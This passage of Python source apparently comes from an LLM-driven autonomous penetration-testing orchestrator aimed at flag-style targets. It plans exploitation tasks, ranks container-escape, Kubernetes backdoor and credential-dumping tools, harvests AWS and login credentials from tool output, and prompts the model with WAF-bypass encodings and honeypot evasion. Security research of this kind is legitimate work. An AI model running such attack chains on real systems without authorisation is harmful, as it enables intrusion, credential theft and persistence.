        self._maybe_compress()
        try:
            content, _ = self.llm.generate(prompt=prompt, system_prompt=SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED, timeout=180.0)
        except Exception as e:
            log.warning("Plan generation LLM call failed: %s — retrying with shorter prompt", e)
            self._maybe_compress()
            try:
                # Retry with top-5 vulns only (shorter prompt)
                short_prompt = prompt.split("## Analyzed Vulnerabilities")[0]
                if self.vulnerabilities:
                    short_vulns = self._format_vulnerability_summary_short(max_items=5)
                    short_prompt += f"## Analyzed Vulnerabilities\n{short_vulns}\n"
                short_prompt += prompt.split("## Available Tools")[1] if "## Available Tools" in prompt else ""
                content, _ = self.llm.generate(prompt=short_prompt, system_prompt=SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED, timeout=180.0)
            except Exception as e2:
                log.warning("Plan generation retry also failed: %s — using hardcoded fallback", e2)
                content = ""

        try:
            tasks = [t for t in (self._extract_json_array(content) or []) if isinstance(t, dict)]
            # Validate tool names against actual registry
            all_valid_tools = (self.attack_gateway.get_tool_names()
                               + self.recon_gateway.get_tool_names())
            # Include MCP tools in validation set
            try:
                all_valid_tools += self.mcp_pool.get_tool_names()
            except Exception:
                pass
            for t in tasks:
                t.setdefault("status", "pending")
                t.setdefault("dependent_task_ids", t.pop("dependencies", []))
                tool = t.get("tool", "")
                if tool and tool not in all_valid_tools:
                    from difflib import get_close_matches
                    matches = get_close_matches(tool, all_valid_tools, n=1, cutoff=0.3)
                    if matches:
                        log.info("Plan: corrected tool '%s' → '%s'", tool, matches[0])
                        t["tool"] = matches[0]
                    else:
                        log.warning("Plan: unknown tool '%s' — removing from plan", tool)
                        t["tool"] = self._guess_tool(t.get("vuln_type", ""))
            plan.tasks = tasks
        except Exception as e:
            log.warning("Plan generation JSON parse failed: %s — using fallback", e)

        # Fallback: create from vulnerability hypotheses
        if not plan.tasks and self.vulnerabilities:
            plan.tasks = []
            for i, v in enumerate(self.vulnerabilities):
                task = {
                    "id": f"task-{i+1}",
                    "instruction": f"Test {v.vuln_type} on {v.endpoint}" + (f" param={v.param}" if v.param else ""),
                    "tool": v.suggested_tool or self._guess_tool(v.vuln_type),
                    "params": v.tool_args if v.tool_args else {"url": v.endpoint, "param": v.param} if v.param else {"url": v.endpoint},
                    "reason": v.evidence[:100] if v.evidence else f"Hypothesized {v.vuln_type}",
                    "dependent_task_ids": [],
                    "status": "pending",
                }
                # Inject suggested payloads from RAG analysis
                if v.suggested_payloads:
                    task["params"]["payload"] = v.suggested_payloads[0]
                    if len(v.suggested_payloads) > 1:
                        task["params"]["payload_batch"] = v.suggested_payloads
                plan.tasks.append(task)

        plan.updated_at = time.strftime("%Y-%m-%dT%H:%M:%S")

        # Sanitize: replace blacklisted tools (e.g. hydra_ssh_brute → ssh_exec)
        self._sanitize_plan_tools(plan.tasks)

        # ── Plan generation summary ─────────────────────────────────
        done = sum(1 for t in plan.tasks if t.get("status") == "done")
        pending = sum(1 for t in plan.tasks if t.get("status") == "pending")
        print(f"\n[PLAN] Generated {len(plan.tasks)} tasks ({done} done, {pending} pending)")
        for t in plan.tasks[:12]:
            status = t.get("status", "pending").upper()
            deps = t.get("dependent_task_ids", []) or t.get("dependencies", [])
            dep_str = f" (depends on: {', '.join(deps)})" if deps else ""
            print(f"  [{status:<8}] {t.get('instruction','')[:100]}{dep_str}")
        if len(plan.tasks) > 12:
            print(f"  ... and {len(plan.tasks) - 12} more tasks")

        return plan

    def _guess_tool(self, vuln_type: str) -> str:
        """Map vuln type to a default tool when no suggested_tool is available."""
        vt = vuln_type.lower()
        if "sql" in vt: return "sqlmap_test"
        if "xss" in vt: return "xss_reflection_test"
        if "cmdi" in vt or "command" in vt: return "command_injection_test"
        if "ssti" in vt: return "send_payload"
        if "lfi" in vt or "path" in vt: return "curl_get"
        if "idor" in vt: return "curl_get"
        if "ssrf" in vt: return "curl_get"
        return "curl_get"

    def _topological_sort(self, tasks: list) -> list:
        """Sort tasks by dependency order using Kahn's algorithm."""
        from collections import deque
        task_map = {t.get("id") or str(id(t)): t for t in tasks}
        in_degree = {tid: 0 for tid in task_map}
        adj = {tid: [] for tid in task_map}
        for t in tasks:
            tid = t.get("id") or str(id(t))
            for dep_id in t.get("dependent_task_ids", []) or t.get("dependencies", []):
                if dep_id in task_map:
                    adj[dep_id].append(tid)
                    in_degree[t["id"]] += 1
                else:
                    log.warning("Task '%s' depends on unknown task '%s' — ignored", t.get("id", "?"), dep_id)
        queue = deque([tid for tid, deg in in_degree.items() if deg == 0])
        result = []
        while queue:
            tid = queue.popleft()
            result.append(task_map[tid])
            for neighbor in adj[tid]:
                in_degree[neighbor] -= 1
                if in_degree[neighbor] == 0:
                    queue.append(neighbor)
        result.extend([task_map[tid] for tid in in_degree if tid not in {r.get("id") or str(id(r)) for r in result}])
        return result

    @staticmethod
    def _detect_cycle(tasks: list) -> list[str]:
        """Detect cycles in task dependency graph using DFS.

        Returns list of task IDs involved in the first cycle found, or empty list.
        """
        task_map = {t.get("id") or str(id(t)): t for t in tasks}
        visited: set[str] = set()
        rec_stack: set[str] = set()
        parent_map: dict[str, str | None] = {}

        def _dfs(tid: str) -> list[str] | None:
            if tid in visited:
                return None
            if tid in rec_stack:
                cycle = [tid]
                cur = tid
                for _ in range(len(task_map) + 1):
                    prev = parent_map.get(cur)
                    if prev is None or prev == tid:
                        break
                    cur = prev
                    cycle.append(cur)
                cycle.append(tid)
                return cycle[::-1]
            if tid not in task_map:
                return None
            rec_stack.add(tid)
            for dep_id in (task_map[tid].get("dependent_task_ids", [])
                           or task_map[tid].get("dependencies", [])):
                if dep_id in task_map:
                    parent_map[dep_id] = tid
                    result = _dfs(dep_id)
                    if result:
                        rec_stack.discard(tid)
                        return result
            rec_stack.discard(tid)
            visited.add(tid)
            return None

        for tid in task_map:
            if tid not in visited:
                result = _dfs(tid)
                if result:
                    return result
        return []

    @staticmethod
    def _break_cycle(tasks: list, cycle: list[str]) -> None:
        """Break a dependency cycle by removing the last edge in the cycle."""
        if len(cycle) < 2:
            return
        last = cycle[-1]
        for t in tasks:
            deps = t.get("dependent_task_ids", []) or t.get("dependencies", [])
            if isinstance(deps, list) and last in deps:
                deps.remove(last)
                return

    def _select_next_plan_task(self, plan: ExploitationPlan | None = None) -> dict | None:
        """Return the first pending task whose dependencies are all done.

        Exploit tasks (command_injection_test, sqlmap_test, etc.) are prioritized
        over probe tasks (curl_get, http_post) to ensure exploitation happens
        before passive reconnaissance in the plan loop.
        """
        plan = plan or self.exploitation_plan
        if not plan or not plan.tasks:
            return None
        _EXPLOIT_PRIORITY = {
            "command_injection_test", "sqlmap_test", "send_payload",
            "xss_reflection_test", "ffuf_fuzz",
            # HTTP exploitation (form-based API exploits, auth bypass, etc.)
            "http_post", "form_extract",
            "redis_cmd", "mysql_query", "psql_query", "mssql_query", "mssqlclient_query",
            "oracle_query", "tomcat_exploit", "php_filter_chain",
            "jwt_forge", "impacket_psexec", "impacket_wmiexec",
            "impacket_pth", "impacket_ticketer", "impacket_silver_ticket",
            "impacket_secretsdump", "impacket_secretsdump_dcsync",
            "impacket_GetUserSPNs", "impacket_GetNPUsers",
            # Container escape tools
            "container_escape_docker_sock", "container_escape_docker_api",
            "container_escape_cgroup", "container_escape_mount_disk",
            "container_escape_cap_dac", "container_escape_procfs",
            "container_escape_runc", "nsenter_exec", "crictl_cmd",
            # Container recon (prerequisite for escape)
            "check_capabilities", "check_mounts",
            "container_find_sockets", "container_find_docker", "container_recon_env",
            # K8s exploitation and post-exploitation
            "kubectl_exec", "kubectl_run",
            "k8s_secret_dump", "k8s_configmap_dump", "k8s_sa_token_steal",
            "k8s_kubelet_exec", "k8s_etcd_keys", "etcdctl_get",
            "k8s_backdoor_daemonset", "k8s_backdoor_cronjob",
            # K8s enumeration (prerequisite for exploitation)
            "kubectl_get_pods", "kubectl_get_secrets",
            "kubectl_get_clusterrolebindings", "kubectl_auth_check",
            "sa_token_read", "kubelet_probe",
            # Cloud exploitation
            "aws_cli", "aws_iam_federation", "check_cloud_metadata",
            "ssrf_probe",
            # Post-exploitation and lateral movement
            "ssh_exec", "shell_exec", "ssh_key_exec",
            "linux_priv_check", "file_upload",
            # Additional exploit tools
            "xxe_inject", "ssti_inject", "graphql_introspect",
            "wpscan_enum", "oracle_tns_poison", "smbmap_enum",
            "gpp_decrypt", "hash_crack", "smb_client",
            "test_credential",
        }
        _LOW_PRIORITY = {
            "hydra_http_brute", "hydra_ssh_brute",
        }
        ready_exploit = []
        ready_probe = []
        ready_low = []
        for task in self._topological_sort(plan.tasks):
            if task.get("status") == "exhausted" or task.get("id") in self._exhausted_task_ids:
                continue
            if task.get("status") != "pending":
                continue
            dep_ids = task.get("dependent_task_ids", []) or task.get("dependencies", [])
            deps_met = True
            all_deps_failed = True if dep_ids else False
            for dep_id in dep_ids:
                dep_task = next((t for t in plan.tasks if t.get("id") == dep_id), None)
                if not dep_task or dep_task.get("status") not in ("done", "failed", "exhausted", "skipped"):
                    deps_met = False
                    break
                if dep_task.get("status") != "failed":
                    all_deps_failed = False
            # When ALL credential-test dependencies failed, the dependent task
            # cannot succeed (e.g. "If any credential succeeded, enumerate DBs"
            # when every credential task returned Login failed).
            if deps_met and all_deps_failed:
                task["status"] = "skipped"
                continue
            if deps_met:
                tool = task.get("tool", "")
                source = task.get("source", "")
                # Semantic priority: task instructions containing exploit
                # keywords (bypass, exploit, assume, inject, takeover, etc.)
                # are exploitation tasks regardless of their declared tool.
                _EXPLOIT_KEYWORDS = [
                    "bypass", "exploit", "assume", "escalat",
                    "inject", "takeover", "token", "flag",
                    " privilege", "admin role", "forgery",
                ]
                def _has_exploit_semantics(t: dict) -> bool:
                    inst = (t.get("instruction") or "").lower()
                    return any(kw in inst for kw in _EXPLOIT_KEYWORDS)
                # Credential-hint tasks unlock downstream exploitation and
                # should execute ASAP — treat them as exploit-priority
                # regardless of their tool type.
                if (source == "credential-hint" or tool in _EXPLOIT_PRIORITY
                        or _has_exploit_semantics(task)):
                    ready_exploit.append(task)
                elif tool in _LOW_PRIORITY:
                    ready_low.append(task)
                else:
                    ready_probe.append(task)
        return (ready_exploit[0] if ready_exploit
                else (ready_probe[0] if ready_probe
                      else (ready_low[0] if ready_low else None)))

    def _extract_recent_artifacts(self) -> str | None:
        """Extract recently discovered intermediate artifacts from DKG state.

        Called after systematic pass and plan-driven task completions to inject
        a summary of recently discovered credentials, endpoints, files, and
        sessions into the LLM context for subsequent task decisions.

        Returns a context message string, or None if nothing new to report.
        """
        parts: list[str] = []
        try:
            creds = self.dkg.query_nodes("Credential")
            if creds:
                recent_creds = [c for c in creds if c.get("confirmed")]
                if recent_creds:
                    parts.append("New confirmed credentials:")
                    for c in recent_creds[-4:]:
                        parts.append(
                            f"  {c.get('cred_type','?')} {c.get('username','?')}"
                            f" @ {c.get('source_host','?')}"
                        )
                # Also surface unconfirmed AWS/cloud credentials — they are
                # actionable even without explicit confirmation (e.g. IMDS
                # metadata extraction yields access keys that DAVE cannot
                # independently verify through a login test).
                _aws_creds = [
                    c for c in creds
                    if not c.get("confirmed")
                    and any(kw in str(c.get("cred_type", "")).lower()
                           for kw in ("aws", "iam", "sts", "s3", "cloud"))
                ]
                for c in _aws_creds[-2:]:
                    ct = c.get("cred_type", "cloud")
                    cuser = c.get("username", "") or c.get("access_key_id", "") or ""
                    chost = c.get("source_host", "") or c.get("host", "") or ""
                    parts.append(
                        f"  [UNCONFIRMED BUT ACTIONABLE] {ct} credential"
                        + (f" {cuser}" if cuser else "")
                        + (f" @ {chost}" if chost else "")
                        + " — use with aws_cli / aws_sts_query / aws_iam_federation"
                    )
            # ── Cryptographic artifacts ──
            # Scan Analysis nodes and Endpoint responses for private keys,
            # PEM certificates, and JWT tokens that may enable federation
            # attacks (SAML / OIDC).  These are often missed because the
            # simple "credentials → test_credential" pipeline doesn't know
            # what to do with raw key material.
            for an in self.dkg.query_nodes("Analysis"):
                ev = str(an.get("evidence", "") or an.get("summary", "") or an.get("findings", "") or "")
                if "-----BEGIN" in ev:
                    parts.append(
                        "PEM / private key material found in analysis output"
                        + " — consider saml_forge → aws_cli assume-role-with-saml"
                    )
                    break

            sessions = self.dkg.query_nodes("Session")
            if sessions:
                parts.append(f"Active sessions ({len(sessions)}):")
                for s in sessions[-4:]:
                    parts.append(
                        f"  {s.get('session_type','?')} on {s.get('host','?')}"
                    )

            # Extract file paths / URLs from recent Endpoint discoveries
            eps = self.dkg.query_nodes("Endpoint")
            recent_eps = [
                e for e in eps
                if e.get("discovered_by") and "deep_recon" in str(e.get("discovered_by", ""))
            ]
            if recent_eps:
                parts.append(f"Recently discovered paths ({len(recent_eps)}):")
                for ep in recent_eps[-6:]:
                    parts.append(f"  {ep.get('url','') or ep.get('uri','')}")
        except Exception:
            return None

        if not parts:
            return None

        return (
            "[INTERMEDIATE ARTIFACTS — recent task results]\n"
            + "\n".join(parts)
            + "\nUse these in subsequent exploitation tasks."
        )

    def _build_defense_evasion_context(self) -> str:
        """Build defense-aware evasion guidance for the plan generation prompt.

        When DPM detects active defenses (WAF, Process Hiding, LOTL), inject
        specific guidance so the LLM adapts its exploitation strategy.
        """
        if not self.defense_state or self.defense_state.defense_complexity < 0.1:
            return ""

        parts: list[str] = []
        ds = self.defense_state

        if ds.waf_type and ds.waf_type != "none":
            parts.append(
                f"**WAF Detected ({ds.waf_type})**: All payloads MUST be encoded BEFORE sending. "
                f"Proactive bypass strategy (apply in order):\n"
                f"  1. Double URL encoding: %25%33%63 → %3c\n"
                f"  2. Case alternation: SeLeCt, UnIoN, FrOm\n"
                f"  3. Inline comments: SEL/**/ECT, UN/**/ION\n"
                f"  4. HTML entity encoding: &#x3c; for <\n"
                f"  5. Parameter pollution: add duplicate params with junk values\n"
                f"  6. Content-Type switch: try multipart/form-data instead of JSON\n"
                f"For SQL injection with WAF, use sqlmap_test with tamper scripts. "
                f"For other payload types, use send_payload with encoding='url_double' or encoding='html_entity'."
            )

        if getattr(ds, 'defense_category_scores', None):
            scores = ds.defense_category_scores
            if isinstance(scores, dict):
                if scores.get("honey", 0) > 0.3:
                    parts.append(
                        "**Honeypot Detected**: Be suspicious of unusually easy credentials, "
                        "obvious flag locations (/flag.txt), and unrestricted access to sensitive "
                        "endpoints. Always verify flags through DAVE."
                    )
                if scores.get("trap", 0) > 0.3:
                    parts.append(
                        "**Trap Detected**: Avoid infinite-loop endpoints, extremely large "
                        "responses, and requests that trigger repeated redirects."
                    )
                if scores.get("cloak", 0) > 0.3:
                    parts.append(
                        "**Cloak Detected**: Some services/ports may be hidden or respond "
                        "slowly. Probe non-standard ports and use timing analysis."
                    )

        if not parts:
            return ""

        return "## Active Defenses (adapt your attack strategy)\n" + "\n".join(parts) + "\n"

    @staticmethod
    def _summarize_task_result(
        tc_names: list[str], success: bool, all_stdouts: list[str]
    ) -> str:
        """Build a summary of task execution result for plan review.

        Includes ALL tool call outputs so the plan-review LLM (which runs
        in a separate call and can't see conversation history) understands
        everything that was discovered.
        """
        if not all_stdouts:
            return "no output"
        # Show up to 3 tool outputs (first, middle if 3+, last if different)
        result_parts: list[str] = []
        n = len(all_stdouts)
        if n <= 2:
            for i, s in enumerate(all_stdouts):
                result_parts.append(s[:600])
        else:
            result_parts.append(all_stdouts[0][:600])
            if n > 2:
                result_parts.append(all_stdouts[n // 2][:400])
            result_parts.append(all_stdouts[-1][:600])
        return "\n---\n".join(result_parts)

    def _format_plan_status(self) -> str:
        """Format plan progress for LLM prompts."""
        plan = getattr(self, 'exploitation_plan', None)
        if not plan or not plan.tasks:
            return "(no plan)"
        done = sum(1 for t in plan.tasks if t.get("status") == "done")
        failed = sum(1 for t in plan.tasks if t.get("status") in ("failed", "skipped", "exhausted"))
        pending = sum(1 for t in plan.tasks if t.get("status") == "pending")
        exhausted = sum(1 for t in plan.tasks if t.get("status") == "exhausted"
                       or t.get("id") in self._exhausted_task_ids)
        lines = [f"## Exploitation Plan ({done}/{len(plan.tasks)} done, {failed} failed, {exhausted} exhausted, {pending} pending)"]
        for t in self._topological_sort(plan.tasks):
            status = t.get("status", "pending").upper()
            deps = t.get("dependent_task_ids", []) or t.get("dependencies", [])
            dep_str = f" (waits for: {', '.join(deps)})" if deps else ""
            lines.append(f"  {t.get('id','?')}: [{status}] {t.get('instruction','')[:100]}{dep_str}")
        return "\n".join(lines)

    def _build_cycle_summary(self) -> "CycleTransitionSummary":
        """Build a structured summary of the current cycle's progress.

        Tracks deltas (new discoveries since last cycle) and surfaces
        failed/successful approaches so the LLM knows what to avoid/repeat.
        """
        from darwin.data_model import CycleTransitionSummary

        plan = getattr(self, 'exploitation_plan', None)
        tasks_done = sum(1 for t in (plan.tasks or []) if t.get("status") == "done") if plan else 0
        tasks_failed = sum(1 for t in (plan.tasks or []) if t.get("status") == "failed") if plan else 0
        tasks_exhausted = sum(1 for t in (plan.tasks or [])
                            if t.get("status") == "exhausted"
                            or t.get("id") in self._exhausted_task_ids) if plan else 0

        failed_approaches = []
        successful_approaches = []
        if plan:
            for t in plan.tasks:
                instr = t.get("instruction", "")
                status = t.get("status", "")
                if status == "failed":
                    failed_approaches.append(instr)
                elif status == "done":
                    successful_approaches.append(instr)

        state = self._get_state()
        flags_found = [str(f) for f in state.flags[:3]]

        prev_ep = getattr(self, '_prev_endpoint_count', 0)
        prev_cred = getattr(self, '_prev_credential_count', 0)
        prev_vuln = getattr(self, '_prev_vulnerability_count', 0)
        new_ep = max(0, len(state.endpoints) - prev_ep)
        new_cred = max(0, len(state.credentials) - prev_cred)
        new_vuln = max(0, len(state.vulnerabilities) - prev_vuln)
        self._prev_endpoint_count = len(state.endpoints)
        self._prev_credential_count = len(state.credentials)
        self._prev_vulnerability_count = len(state.vulnerabilities)

        # No-progress detection: terminate if consecutive loops produce nothing
        if new_ep == 0 and new_cred == 0 and new_vuln == 0 and not flags_found:
            self._no_progress_loops += 1
        else:
            self._no_progress_loops = 0

        highest_vuln = ""
        if self.vulnerabilities:
            best = max(self.vulnerabilities, key=lambda v: v.confidence, default=None)
            if best:
                highest_vuln = f"{best.vuln_type} @ {best.endpoint} ({best.confidence:.0%})"

        return CycleTransitionSummary(
            cycle_number=self._loop_count,
            flags_found=flags_found,
            tasks_completed=tasks_done,
            tasks_failed=tasks_failed,
            tasks_exhausted=tasks_exhausted,
            new_endpoints=new_ep,
            new_credentials=new_cred,
            new_vulnerabilities=new_vuln,
            defense_changed=bool(self.defense_state.waf_type),
            waf_type=self.defense_state.waf_type or "",
            failed_approaches=failed_approaches[-10:],
            successful_approaches=successful_approaches[-5:],
            active_sessions=[s.get("host", "") for s in self.dkg.query_nodes("Session")],
            highest_confidence_vuln=highest_vuln,
        )

    async def _execute_single_tool(
        self, tool_name: str, params: dict
    ) -> "ToolResult":
        """Execute one tool via the appropriate gateway.

        Returns a ToolResult-compatible object with .success, .stdout, .stderr, .exit_code.
        """
        try:
            if tool_name in self.attack_gateway.get_tool_names():
                return await self.attack_gateway.call(tool_name, params)
            elif tool_name in self.recon_gateway.get_tool_names():
                return await self.recon_gateway.call(tool_name, params)
            elif tool_name in self.mcp_pool.get_tool_names():
                mcp_raw = await self.mcp_pool.call_tool(tool_name, params)
                mcp_text = json.dumps(mcp_raw, ensure_ascii=False)
                is_error = mcp_raw.get("isError", False)
                error_text = ""
                if is_error:
                    content_list = mcp_raw.get("content", [])
                    if content_list and isinstance(content_list[0], dict):
                        error_text = content_list[0].get("text", "")
                return ToolResult(
                    tool_name=tool_name,
                    success=not is_error,
                    stdout=error_text if is_error else mcp_text,
                    stderr=error_text,
                    exit_code=1 if is_error else 0,
                    elapsed_ms=0,
                )
            else:
                return ToolResult(
                    tool_name=tool_name, success=False,
                    stdout=f"Unknown tool: {tool_name}", stderr="",
                    exit_code=1, elapsed_ms=0,
                )
        except Exception as e:
            return ToolResult(
                tool_name=tool_name, success=False,
                stdout="", stderr=str(e), exit_code=1, elapsed_ms=0,
            )

    async def _analyze_and_fix_task(
        self, task: dict, output: str
    ) -> dict | None:
        """Ask LLM whether task failure is fixable (wrong params) or not.

        Returns dict with corrected_params + reason if fixable, None otherwise.
        """
        instruction = task.get("instruction", "")[:200]
        tool = task.get("tool", "")
        params = task.get("params", {})
        params_str = json.dumps(params)
        output_trunc = output[:1500]

        # Meta-cognition: auto-search RAG when unfamiliar technology detected
        rag_hint = ""
        output_lower = output.lower()
        _unfamiliar_keywords = [
            "unrecognized", "unknown protocol", "not supported", "no tool available",
            "unsupported service", "cannot connect", "no handler", "not implemented",
        ]
        if any(kw in output_lower for kw in _unfamiliar_keywords):
            # Try to extract service/technology name from task instruction
            svc_match = re.search(
                r'(?:mysql|postgresql|redis|mongo|oracle|mssql|elasticsearch|couchdb'
                r'|memcached|rabbitmq|kafka|zookeeper|etcd|consul|nacos)',
                instruction.lower()
            )
            svc_name = svc_match.group(0) if svc_match else ""
            if svc_name:
                try:
                    rag = get_rag()
                    rag_results = rag.search(f"{svc_name} exploitation authentication bypass techniques", top_k=3, category="", min_keyword_overlap=0.1)
                    if rag_results:
                        rag_text = "\n".join(
                            f"- {r.get('title','')}: {r.get('description','')[:200]}"
                            for r in rag_results[:3]
                        )
                        rag_hint = (
                            f"\n\n[META-COGNITION] The tool failure suggests unfamiliarity with {svc_name}. "
                            f"RAG knowledge about {svc_name} exploitation:\n{rag_text}\n"
                            f"Based on this knowledge, re-evaluate whether the task can be fixed "
                            f"by using the correct tool/protocol for {svc_name}."
                        )
                except Exception:
                    pass

        # Detect timeout/hang failures and add targeted hints
        timeout_hint = ""
        if ("timed out" in output_lower or "no output" in output_lower
                or "exit=-1" in output or "timeout" in output_lower):
            timeout_hint = (
                "\nThis task TIMED OUT or produced no output. "
                "Common causes for shell_exec timeouts:\n"
                "- An interactive prompt waiting for user input (e.g. ssh-keygen "
                "asking to overwrite an existing file, or asking for a passphrase)\n"
                "- A command that hangs waiting for network/input\n"
                "Fix by: adding flags to skip prompts (ssh-keygen: use -N '' for "
                "empty passphrase + rm -f the output file first to avoid overwrite "
                "prompt), or adding a timeout prefix.\n"
            )

        prompt = f"""A task failed during execution. Analyze whether the failure
is due to incorrect tool parameters (fixable) or because the target
is genuinely not vulnerable to this attack (not fixable).

Task instruction: {instruction}
Tool called: {tool}
Parameters used: {params_str}
Tool output:
{output_trunc}
{timeout_hint}
{rag_hint}
Classify:
- "fixable" if the tool was called with wrong/malformed parameters
  (e.g. wrong command syntax, non-existent file path, missing required
  args, command would cause an interactive prompt)
- "partial_success" if the tool connected and authenticated successfully
  but a sub-command within the tool failed (e.g. MSSQL login OK but
  xp_cmdshell command not found). Credentials are valid — store them.
- "not_fixable" if the tool executed correctly but the attack didn't
  work (e.g. target not vulnerable, authentication failed, credential
  rejected, service not available, connection refused)

If fixable, provide corrected_params.
If partial_success, include credentials: {{"username":...}}.
Otherwise not_fixable.

Output ONLY valid JSON:
{{"fixable": true/false, "corrected_params": {{...}}, "partial_success": true/false, "credentials": {{...}}, "reason": "..."}}"""

        try:
            content, _ = self.llm.generate(prompt=prompt)
            # Extract JSON from response
            match = re.search(r"\{[\s\S]*\}", content)
            if not match:
                return None
            result = json.loads(match.group(0))
            if result.get("fixable") and result.get("corrected_params"):
                return {
                    "fixable": True,
                    "corrected_params": result["corrected_params"],
                    "reason": result.get("reason", ""),
                }
            if result.get("partial_success"):
                return {
                    "fixable": False,
                    "partial_success": True,
                    "credentials": result.get("credentials", {}),
                    "reason": result.get("reason", ""),
                }
        except Exception:
            pass
        return None

    async def _extract_credentials_from_task(
        self, task: dict, raw_stdouts: list[str]
    ) -> None:
        """Extract discovered credentials from task stdout → DKG + CTEG.

        Regex pre-filters for credential patterns, then uses a lightweight
        LLM call (classifier profile, isolated session) to extract structured
        username:password pairs. Only fires for tools that commonly discover
        credentials (shell_exec, ssh_exec, test_credential).

        Extracted credentials are stored as DKG Credential nodes and in CTEG,
        making them available for $credentials.* placeholder resolution in
        subsequent tasks.
        """
        tool = str(task.get("tool", "") or "")
        if tool not in ("shell_exec", "ssh_exec", "test_credential",
                        "aws_cli", "curl_get", "ssrf_probe"):
            return

        combined = "\n".join(raw_stdouts)
        if len(combined) < 20:
            return

        # ── AWS credential extraction ──────────────────────────────
        # IMDS returns AccessKeyId/SecretAccessKey/Token — extract these
        # directly without requiring an LLM call (format is well-known).
        _aws_json_match = re.search(
            r'"AccessKeyId"\s*:\s*"([^"]+)"\s*,\s*"SecretAccessKey"\s*:\s*"([^"]+)"'
            r'(?:,\s*"Token"\s*:\s*"([^"]+)")?',
            combined,
        )
        if _aws_json_match:
            _ak = _aws_json_match.group(1)
            _sk = _aws_json_match.group(2)
            _token = _aws_json_match.group(3) or ""
            _host = ""
            _port = ""
            for s in self.dkg.query_nodes("Service"):
                _p = s.get("port", 0)
                if _p:
                    _host = "localhost"
                    _port = str(_p)
                    break
            cred_id = f"cred-aws-{_ak[:8]}-{int(time.time()) % 100000}"
            self.dkg.add_node("Credential", cred_id, {
                "username": _ak, "password": _sk,
                "access_key": _ak, "secret_key": _sk, "session_token": _token,
                "cred_type": "aws", "source_host": _host or "localhost",
                "port": int(_port) if _port else 0,
                "source": "imds_extracted",
            })
            log.info("Extracted AWS credentials: AccessKeyId=%s... SecretAccessKey=%s...",
                     _ak[:12], _sk[:8])
            # CTEG task recording is handled by the orchestrator's main loop
            # at orchestrator.py:630 via TaskRecord dataclass — no explicit
            # commit_task call needed here.
            return

        # ── Regex pre-filter ────────────────────────────────────────
        # Avoid LLM cost when stdout clearly doesn't contain credentials.
        _has_success = bool(re.search(
            r'(?i)(success|成功|working|valid|found|凭证|密码正确|login\s+ok|authenticated)',
            combined,
        ))
        if not _has_success:
            return

        # Check for username:password or user/pass patterns near success
        _cred_patterns = re.findall(
            r'(?i)(?:SUCCESS|OK|working|valid|found)[^\n]{0,80}?'
            r'(\w[\w.-]{1,30})\s*[:/]\s*(\S{1,50})',
            combined,
        )
        if not _cred_patterns:
            # Fallback: bare user:pass patterns anywhere in output
            _cred_patterns = re.findall(
                r'(?:^|\s)(\w{2,20}):(\S{3,50})(?:\s|$)',
                combined,
            )
        if not _cred_patterns:
            return

        # ── LLM extraction (isolated session, classifier profile) ──
        _port = ""
        _svc_name = "ssh"
        _task_params = task.get("params", {}) or {}
        if isinstance(_task_params, dict):
            _port = str(_task_params.get("port", ""))
            _cmd = str(_task_params.get("command", ""))
            if "mysql" in _cmd.lower():
                _svc_name = "mysql"
            elif "psql" in _cmd.lower() or "postgres" in _cmd.lower():
                _svc_name = "postgres"
            elif "redis" in _cmd.lower():
                _svc_name = "redis"
            elif "mssql" in _cmd.lower():
                _svc_name = "mssql"
        # Fallback: look up SSH port from DKG Service nodes
        if not _port:
            for s in self.dkg.query_nodes("Service"):
                _svc_name_s = (s.get("service_name", "") or "").lower()
                if "ssh" in _svc_name_s:
                    _p = s.get("port", 0)
                    if _p:
                        _port = str(_p)
                        break

        _output_snippet = combined[:2000]
        _candidates_str = ", ".join(
            f"{u}:{p}" for u, p in _cred_patterns[:15]
        )
        prompt = (
            f"A penetration testing task discovered working credentials. "
            f"Extract ALL valid username:password pairs from the output.\n\n"
            f"Task instruction: {task.get('instruction', '')[:200]}\n"
            f"Service: {_svc_name}\n"
            f"Regex candidates: {_candidates_str}\n\n"
            f"Task output:\n{_output_snippet}\n\n"
            f"Return ONLY valid JSON — an array of credential objects:\n"
            f'[{{"username":"...", "password":"..."}}]\n'
            f'If no valid credentials found, return: []'
        )

        try:
            from darwin.utils.llm import LLMSession
            _classifier = LLMSession.from_config("classifier")
            content, _ = _classifier.generate(prompt=prompt)
            if not content:
                return
            # Extract JSON from response
            match = re.search(r"\[[\s\S]*?\]", content)
            if not match:
                return
            creds_list = json.loads(match.group(0))
            if not isinstance(creds_list, list) or not creds_list:
                return
        except Exception:
            return

        # ── Store in DKG + CTEG ─────────────────────────────────────
        for cred in creds_list:
            username = str(cred.get("username", "")).strip()
            password = str(cred.get("password", "")).strip()
            if not username or not password:
                continue
            _cred_id = f"cred-discovered-{username}-{int(time.time())}"
            self.dkg.add_node("Credential", _cred_id, {
                "username": username,
                "password": password,
                "host": self.target_host,
                "port": int(_port) if _port and _port.isdigit() else 0,
                "source_host": self.target_host,
                "cred_type": _svc_name,
                "source": "task_discovery",
            })
            try:
                self.cteg.add_credential(
                    host=self.target_host,
                    port=int(_port) if _port and _port.isdigit() else 0,
                    service_type=_svc_name,
                    username=username, password=password,
                    source="task_discovery",
                )
            except Exception:
                pass
            log.info(
                "Credential extracted from task output: %s:*** → DKG + CTEG",
                username,
            )
            print(f"\n[CRED] Discovered: {username}:**** → stored for subsequent tasks")

    # ── Plan task dedup + capping helpers ──────────────────────────────

    @staticmethod
    def _is_duplicate_task(new_task: dict, existing_tasks: list[dict]) -> bool:
        """Check if *new_task* is a semantic duplicate of any pending task.

        Two checks:
        1. Same tool + same endpoint → definite duplicate
        2. Instruction word overlap > 75% → near-duplicate
        """
        _nt_inst = (new_task.get("instruction") or "").lower()
        _nt_tool = (new_task.get("tool") or "").lower()
        _nt_endpoint = (
            new_task.get("endpoint")
            or new_task.get("params", {}).get("target_url", "")
            or new_task.get("params", {}).get("url", "")
            or new_task.get("params", {}).get("target", "")
            or new_task.get("params", {}).get("host", "")
        ).lower()

        for pt in existing_tasks:
            if not isinstance(pt, dict):
                continue
            if pt.get("status") != "pending":
                continue
            # Same tool + same endpoint = definite duplicate
            _pt_tool = (pt.get("tool") or "").lower()
            _pt_endpoint = (
                pt.get("endpoint")
                or pt.get("params", {}).get("target_url", "")
                or pt.get("params", {}).get("url", "")
                or pt.get("params", {}).get("target", "")
                or pt.get("params", {}).get("host", "")
            ).lower()
            if _nt_tool and _pt_tool and _nt_endpoint and _pt_endpoint:
